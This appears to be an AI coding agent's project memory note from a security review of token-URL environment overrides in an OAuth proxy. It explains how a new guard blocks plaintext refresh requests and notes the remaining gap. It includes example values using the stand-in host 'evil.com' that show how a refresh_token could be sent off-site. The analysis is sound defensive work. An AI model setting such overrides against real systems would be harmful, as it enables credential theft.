---
name: claude-token-url-egress
description: SHUNT_CLAUDE/CODEX_TOKEN_URL override — PR #129 (issue #118) added a scheme/loopback plaintext guard; residual = https to ANY host still allowed (no provider host allowlist, asymmetric with base_url).
metadata:
  type: project
---

`ClaudeAuthStore::new` (src/auth/claude/auth.rs) and `CodexAuthStore::new`
(src/auth/codex/auth.rs) read `SHUNT_CLAUDE_TOKEN_URL` / `SHUNT_CODEX_TOKEN_URL`
to override the OAuth refresh endpoint. The refresh POST carries the long-lived
`refresh_token`.

**Post-PR #129 (issue #118) state — the plaintext hole is CLOSED.** Both stores now
route the raw env value through the shared `auth::shared::sanitize_token_url(raw,
default_url)` (src/auth/shared.rs). Accept rule: `url.scheme()=="https"` (any host)
OR (`http` AND `crate::config::host_is_loopback(host)`); anything else (empty,
unparseable, http off-loopback) falls back to the hardcoded provider default. Guard
verified sound — no bypass via scheme case (url crate lowercases), userinfo
(`http://127.0.0.1@evil.com` → host_str "evil.com" → rejected), bracketed IPv6
(`[::2]` → strip → not loopback → rejected), empty host, or decimal-IP forms of
127.0.0.1 (normalize to real loopback). Production `new()` is wired to the guard;
`with_token_url` is test-only. So the refresh_token can NO LONGER reach a
non-loopback PLAINTEXT endpoint.

**Residual (env-gated, low/defense-in-depth):** `https` to ANY host is still
accepted, so `SHUNT_*_TOKEN_URL=https://evil.com/` egresses the refresh_token
off-origin over TLS. This is ASYMMETRIC with `base_url`, which `Config::validate`
host-allowlists to the provider (config.rs:1104-1116 claude_oauth: non-loopback ⇒
https AND `host_is_anthropic`; 1134-1146 chatgpt_oauth ⇒ `host_is_chatgpt`). The
refresh_token endpoint carries the MORE sensitive long-lived credential yet has the
WEAKER destination guard (scheme-only, no host allowlist). Intentional/documented
(the code comment says https-to-any-host is deliberate so test mocks can use https
on arbitrary hosts). Env-gated: only someone who controls the shunt process env can
set it, and they could already read the credential files.

**How to apply:** if hardening further, add a provider host allowlist to
`sanitize_token_url` (anthropic.com / openai.com + loopback), mirroring base_url —
tests currently use `https://mock.example` / `https://claude-mock.test`, so they'd
need to move to loopback https. Related: [[project_token-file-writers]],
[[project_codex-multi-account-security]].
